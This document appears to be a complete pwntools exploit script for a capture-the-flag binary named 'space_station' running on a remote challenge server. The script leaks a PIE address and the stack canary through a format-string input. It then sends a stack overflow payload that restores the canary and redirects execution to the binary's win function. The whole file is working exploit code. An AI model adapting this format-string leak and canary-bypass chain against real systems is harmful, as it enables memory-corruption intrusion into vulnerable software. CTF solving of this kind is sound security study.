#!/usr/bin/env python3
from pwn import *


elf = context.binary = ELF("./space_station", checksec=False)

CANARY_IDX = 15
OFFSET_TO_CANARY = 72
OFFSET_TO_RIP = 88
BASE_IDX = 17
ret = 0x000000000000101a


p = remote("offsec.m0lecon.it", 13550)

p.recvuntil(b"ID: ")
p.sendline(f"%{BASE_IDX}$lx %{CANARY_IDX}$lx".encode())

line = p.recvline().strip().split()

leak = int(line[0], 16)
canary = int(line[1], 16)

pie_base = leak - 0x139e

log.info(f"canary = {canary:#x}")
p.recvuntil(b"log: ")
payload = flat(
b"A" * OFFSET_TO_CANARY,
p64(canary),
b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
p64(ret+pie_base),
p64(elf.sym.win+pie_base),
)
p.sendline(payload)


p.interactive()


# Your exploit here

